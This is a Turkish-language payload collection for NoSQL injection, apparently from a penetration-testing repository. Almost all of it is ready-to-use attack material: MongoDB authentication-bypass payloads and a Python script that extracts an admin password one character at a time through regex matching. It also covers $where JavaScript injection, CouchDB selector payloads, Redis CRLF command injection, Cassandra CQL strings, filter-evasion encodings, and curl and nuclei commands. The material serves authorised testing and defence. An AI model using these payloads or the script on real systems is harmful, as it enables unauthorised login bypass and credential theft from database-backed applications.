# 🍃 NoSQL Enjeksiyonu Payload Koleksiyonu

[🇬🇧 English](../NoSQL-Injection.md)

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 MongoDB Enjeksiyonu

### Kimlik Doğrulama Atlatma (Auth Bypass)
```javascript
// JSON enjeksiyonu
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// URL kodlamalı (URL encoded parametreler)
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Yaygın NoSQL Operatörleri
```javascript
$eq     // Eşittir (Equal)
$ne     // Eşit değildir (Not equal)
$gt     // Büyüktür (Greater than)
$gte    // Büyük veya eşittir (Greater than or equal)
$lt     // Küçüktür (Less than)
$lte    // Küçük veya eşittir (Less than or equal)
$in     // Dizi içinde mevcut (In array)
$nin    // Dizi içinde mevcut değil (Not in array)
$regex  // Düzenli ifade (Regular expression)
$exists // Alan mevcut mu kontrolü (Field exists)
$or     // Mantıksal VEYA (Logical OR)
$and    // Mantıksal VE (Logical AND)
$where  // Özel JavaScript ifadesi çalıştırma
```

---

## 💉 Temel Payload'lar

### URL Parametre Enjeksiyonu
```
# Kimlik doğrulama atlatma
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Her zaman doğru (Always true) koşulları
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

### JSON Gövdesi (Body) Enjeksiyonu
```json
// Temel atlatma
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Regex ile atlatma
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// OR (VEYA) koşulu
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Büyüktür operatörü ile boş olmayan alan kontrolü
{"username": "admin", "password": {"$gt": ""}}
```

---

## 🔥 Veri Çıkarma (Data Extraction)

### Regex Tabanlı Karakter Karakter Veri Çıkarma
```javascript
// Parolayı ilk karakterinden başlayarak keşfetme
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// Konuma göre karakter çıkarma
password[$regex]=^.{0}a.*   // İlk karakter 'a' mı?
password[$regex]=^.{1}b.*   // İkinci karakter 'b' mi?

// Karakter kümesi aralıkları
password[$regex]=^[a-z].*   // Küçük harfle mi başlıyor?
password[$regex]=^[A-Z].*   // Büyük harfle mi başlıyor?
password[$regex]=^[0-9].*   // Rakamla mı başlıyor?
```

### Kör Boolean Veri Çıkarma Otomasyon Betiği
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Buldum: {password}")
            found = True
            break
    if not found:
        break

print(f"Parola: {password}")
```

---

## 🚀 İleri Düzey Payload'lar

### $where ile JavaScript Enjeksiyonu
```javascript
// Uyutma tabanlı (Zaman tabanlı kör analiz)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Veri çıkarma koşulları
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// Hata tabanlı
{"$where": "this.constructor.constructor('return this.password')()"}
```

### Dizi Operatörü Enjeksiyonu
```json
// $in operatörü
{"username": {"$in": ["admin", "administrator", "root"]}}

// $nin operatörü
{"username": {"$nin": ["guest", "anonymous"]}}
```

### Operatör Manipülasyonu
```
# Alanı operatöre dönüştürme
username=admin&password[$ne]=wrongpassword

# İç içe operatör kullanımı
username[$eq]=admin&password[$regex]=^p

# Çoklu karşılaştırma operatörleri
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

## 🍃 CouchDB Enjeksiyonu

### Temel Payload'lar
```javascript
// Kimlik doğrulama atlatma
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Regex
{"selector": {"username": {"$regex": ".*"}}}

// Büyüktür kontrolü
{"selector": {"password": {"$gt": null}}}
```

### Görünüm (View) Enjeksiyonu
```javascript
// Mango sorgu enjeksiyonu
{"selector": {"_id": {"$gt": null}}}

// Tüm dökümanları listeleme
{"selector": {"_id": {"$regex": ".*"}}}
```

---

## 🔴 Redis Enjeksiyonu

### Temel Komutlar
```redis
# Anahtar numaralandırma
KEYS *
SCAN 0

# Veri okuma
GET anahtar_adi
HGETALL hash_adi

# Veri yazma
SET anahtar deger
HSET hash alan deger
```

### Uygulama Üzerinden Komut Enjeksiyonu
```
# Kullanıcı girdisi doğrudan Redis komutuna aktarılıyorsa CRLF enjeksiyonu:
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

## 📊 Cassandra Enjeksiyonu

### CQL (Cassandra Query Language) Enjeksiyonu
```sql
-- Temel enjeksiyon
' OR '1'='1
' OR ''='

-- ALLOW FILTERING atlatması
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Yorum satırı enjeksiyonu
admin'--
admin'/*
```

---

## 🛡️ Filtre Atlatma Teknikleri

### URL Kodlaması
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

### Unicode Atlatması
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

### Dizi Sözdizimi Varyasyonları
```
# Standart
password[$ne]=

# Alternatif
password[0][$ne]=
password[][$ne]=
```

### Content-Type Manipülasyonu
```
# Form URL-encoded yerine JSON gönderme
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

## 📝 Enjeksiyon Noktaları

```
POST /login
- İstek gövdesi parametreleri (JSON veya Form)
- URL Query parametreleri

GET /users?id=
- Query string parametreleri

HTTP Başlıkları:
- Authorization
- Cookie değerleri

API Uç Noktaları:
- MongoDB arka planlı GraphQL sorguları
- REST API filtre ve arama parametreleri
```

---

## 🔍 Tespit Kontrol Listesi (Checklist)

```markdown
□ $ne operatörünü test edin: {"field": {"$ne": ""}}
□ $gt operatörünü test edin: {"field": {"$gt": ""}}
□ $regex operatörünü test edin: {"field": {"$regex": ".*"}}
□ $where operatörünü test edin: {"$where": "1==1"}
□ URL dizi biçimini test edin: field[$ne]=
□ JSON operatörlerini deneyin
□ Yanıt sürelerindeki farklılıkları ölçün (Zaman tabanlı)
□ Yanıt boyutlarındaki / uzunluklarındaki değişiklikleri inceleyin
□ Farklı Content-Type başlıkları ile istek yapın
```

---

## 🔗 Kullanışlı Araçlar

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# MongoDB enjeksiyon tarayıcısı (Nuclei şablonu)
nuclei -t nosql-injection.yaml -u http://target

# cURL ile manuel test
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

## 🔗 İlgili Kılavuzlar

- [SQLi Payload'ları](./SQLi.tr.md)
- [GraphQL Enjeksiyonu](./GraphQL-Injection.tr.md)

---

**Ana Dizine Dön:** [📖 Genel Kılavuz](../../README.tr.md)
